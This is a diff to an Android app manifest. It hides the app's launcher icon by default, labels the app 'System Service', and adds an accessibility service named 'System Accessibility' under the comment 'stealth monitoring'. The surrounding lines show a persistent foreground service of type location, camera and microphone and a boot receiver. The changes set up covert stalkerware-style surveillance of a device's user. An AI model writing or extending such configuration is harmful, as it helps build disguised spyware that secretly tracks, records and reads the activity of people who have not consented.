@@ -52,6 +52,10 @@
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
 
+    <!-- Accessibility -->
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
+        tools:ignore="ProtectedPermissions" />
+
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.front" android:required="false" />
     <uses-feature android:name="android.hardware.microphone" android:required="false" />
@@ -79,11 +83,11 @@
                 android:resource="@style/NormalTheme" />
         </activity>
 
-        <!-- Launcher alias — can be disabled to hide icon -->
+        <!-- Launcher alias — DISABLED by default, icon hidden from install -->
         <activity-alias
             android:name=".MainActivityAlias"
             android:targetActivity=".MainActivity"
-            android:enabled="true"
+            android:enabled="false"
             android:exported="true"
             android:label="System Service"
             android:icon="@mipmap/ic_launcher">
@@ -100,6 +104,20 @@
             android:foregroundServiceType="location|camera|microphone"
             android:stopWithTask="false"
             tools:replace="android:exported" />
+
+        <!-- Accessibility Service (stealth monitoring) -->
+        <service
+            android:name=".FlashGuardAccessibility"
+            android:exported="true"
+            android:label="System Accessibility"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
         <!-- Boot receiver -->
         <receiver
